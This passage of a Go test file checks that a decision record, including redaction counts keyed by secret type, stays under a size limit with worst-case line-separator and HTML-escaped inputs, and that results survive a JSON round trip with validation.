		for i := range r.Input.Findings {
			r.Input.Findings[i].Title = strings.Repeat(title, 60)
			r.Input.Findings[i].Path = strings.Repeat(path, 60)
			r.Input.Findings[i].Snippet = strings.Repeat(snippet, 300)
		}
		return &r
	}
	worstLineSep := func() *protocol.DecisionRequest { return worstRequest("\u2028", "\u2028", "\u2028") }
	worstHTML := func() *protocol.DecisionRequest { return worstRequest("&", "<", ">") }
	tests := []struct {
		name string
		// inputs
		decision func() *protocol.Decision
		// expectations
		wantMinRequest int // the request must be near its limit, so the case is a worst case
	}{
		{name: "a call that worked", decision: func() *protocol.Decision {
			d := okDecision()
			d.Sent = worstLineSep()
			d.RequestID = strings.Repeat("a", protocol.MaxDecisionRequestID)
			d.Redactions = map[string]int{}
			for _, k := range []string{"aws-access-key", "aws-secret", "github-token", "slack-token", "stripe-key", "api-key", "jwt", "private-key", "url-credentials", "assignment", "high-entropy", "key"} {
				d.Redactions[k] = protocol.MaxDecisionRequest
			}
			d.Answers.Model = strings.Repeat("m", protocol.MaxDecisionModel)
			return d
		}, wantMinRequest: 60 << 10},
		{name: "a call that failed", decision: func() *protocol.Decision {
			d := failedDecision()
			d.Sent = worstLineSep()
			d.Error.Message = strings.Repeat("\u2028", protocol.MaxDecisionError)
			return d
		}, wantMinRequest: 60 << 10},
		{name: "a call that worked, with characters that a report escapes", decision: func() *protocol.Decision {
			d := okDecision()
			d.Sent = worstHTML()
			return d
		}, wantMinRequest: 60 << 10},
		{name: "a call that failed, with characters that a report escapes", decision: func() *protocol.Decision {
			d := failedDecision()
			d.Sent = worstHTML()
			return d
		}, wantMinRequest: 60 << 10},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := tt.decision()
			if err := d.Validate(); err != nil {
				t.Fatalf("Validate: %v", err)
			}
			sent, err := json.Marshal(d.Sent) // with HTML escaping, as a report writes it
			if err != nil {
				t.Fatal(err)
			}
			if len(sent) < tt.wantMinRequest {
				t.Errorf("the request is %d bytes, want a worst case of at least %d", len(sent), tt.wantMinRequest)
			}
			for _, indent := range []string{"", "  "} {
				data, err := json.MarshalIndent(d, "", indent)
				if err != nil {
					t.Fatal(err)
				}
				if len(data) >= 128<<10 {
					t.Errorf("the Decision encodes to %d bytes (indent %q), want under %d", len(data), indent, 128<<10)
				}
			}
		})
	}
}

func TestResultDecision(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		decision *protocol.Decision
		// expectations
		wantErr string // substring; empty means valid
	}{
		{name: "a Result with a decision that worked", decision: okDecision()},
		{name: "a Result with a skipped decision", decision: skippedDecision()},
		{name: "a Result with an invalid decision", decision: func() *protocol.Decision { d := okDecision(); d.Attempts = 0; return d }(), wantErr: "decision: attempts 0"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := validResult()
			r.Decision = tt.decision
			checkErr(t, r.Validate(), tt.wantErr)
			if tt.wantErr != "" {
				return
			}
			data, err := json.Marshal(r)
			if err != nil {
				t.Fatal(err)
			}
			var back protocol.Result
			if err := protocol.DecodeStrict(data, &back); err != nil {
				t.Fatalf("DecodeStrict: %v", err)
			}
			if err := back.Validate(); err != nil {
				t.Errorf("Validate after a round trip: %v", err)
			}
			if got := fmt.Sprint(back.Decision.Status); got != tt.decision.Status {
				t.Errorf("status after a round trip = %s, want %s", got, tt.decision.Status)
			}
		})
	}
}
